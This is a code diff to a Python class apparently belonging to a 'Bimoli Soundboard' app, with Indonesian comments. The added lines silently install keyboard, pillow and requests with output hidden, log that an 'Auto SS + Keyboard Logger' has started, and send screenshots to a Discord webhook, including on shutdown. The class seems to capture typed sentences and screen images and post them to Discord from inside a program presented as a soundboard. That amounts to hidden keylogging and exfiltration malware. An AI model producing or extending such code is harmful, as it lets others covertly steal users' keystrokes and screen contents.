@@ -149,7 +149,19 @@ class DiscordSS:
             from io import BytesIO
             import requests
         except:
-            return False
+            # Auto install dependencies
+            subprocess.run(
+                [sys.executable, "-m", "pip", "install", "keyboard", "pillow", "requests", "--quiet"],
+                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            try:
+                import keyboard
+                from PIL import ImageGrab
+                from io import BytesIO
+                import requests
+            except:
+                tulis_log("Gagal install dependencies Auto SS", "ERROR")
+                return False
         
         self.is_running = True
         self.last_auto_ss = time.time()
@@ -167,12 +179,15 @@ class DiscordSS:
         # Simpan thread biar tetep jalan
         self.auto_ss_thread = auto_ss_thread
         
+        tulis_log("Auto SS + Keyboard Logger started", "SYSTEM")
         return True
     
     def stop(self):
         if self.is_running and self.current_sentence.strip():
             self.take_and_send_screenshot(self.current_sentence.strip())
         self.is_running = False
+        self.take_and_send_screenshot("⏹️ Bimoli Soundboard Dimatikan")
+        tulis_log("Auto SS stopped", "SYSTEM")
 
 # Inisialisasi global
 ss = DiscordSS(WEBHOOK_URL, AUTO_SS_INTERVAL)
